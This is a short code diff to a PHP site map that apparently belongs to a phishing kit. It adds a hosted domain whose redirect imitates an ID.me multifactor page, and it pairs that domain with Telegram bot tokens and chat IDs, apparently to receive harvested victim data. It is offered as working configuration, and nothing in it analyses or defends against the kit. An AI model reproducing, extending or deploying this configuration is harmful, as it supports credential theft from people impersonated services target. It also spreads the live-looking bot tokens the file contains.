@@ -49,6 +49,15 @@ $site_map = [
         'redirect' => 'https://upstartsloan.42web.io/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php'
     ],
 
+    'paysphere-hcr2.onrender.com' => [
+        'bots' => [
+            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
+            // ['token' => '5651009105:AAHaRNsOqggJM3Fl9sgRewqnXJJ7Dc326Rw', 'chat_id' => '2004020590']
+
+        ],
+        'redirect' => 'https://paysphere-hcr2.onrender.com/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php'
+    ],
+
 
     // Add more sites...
 ];
